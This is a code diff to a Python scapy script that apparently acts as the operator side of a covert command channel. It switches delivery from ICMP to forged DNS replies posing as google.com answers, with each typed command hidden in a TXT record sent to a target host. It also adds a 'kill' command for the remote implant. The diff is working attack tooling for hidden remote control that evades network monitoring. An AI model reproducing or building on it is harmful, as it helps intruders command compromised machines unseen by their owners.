@@ -6,7 +6,7 @@
 #   craft the packet
 # wait for new command
 
-from scapy.all import send
+from scapy.all import send, RandShort, get_if_list
 from scapy.layers.inet import IP, ICMP, UDP
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 
@@ -24,10 +24,16 @@ def makeDNSPacket(command):
     global target
     query = DNS(
         rd=1,
-        qd=DNSQR(qname="example.com"),
-        an=DNSRR(rrname="example.com", type="TXT", rdata=command),
+        qr=1,
+        # id=RandShort(),
+        qd=DNSQR(qname="google.com", qtype="A"),
+        an=[
+            DNSRR(rrname="google.com", type="A", rdata="8.8.8.8"),
+            DNSRR(rrname="google.com", type="TXT", rdata="command=" + command),
+        ],
     )
-    toBeSent = IP(dst=target) / UDP(port=53) / query
+    toBeSent = IP(dst=target) / UDP(sport=53, dport=54576) / query
+    send(toBeSent, verbose=False)
 
 
 # start program
@@ -36,9 +42,10 @@ def main() -> None:
 
     global target
     target = argv[1]
+    print(get_if_list())
     while 1:
         command_input = str(input("Command input >> "))
-        makeICMPPacket(command_input)
+        makeDNSPacket(command_input)
         if command_input == "kill":
             kill = input(
                 "Sent kill via ICMP. Would you like to kill the server (y/N)? "
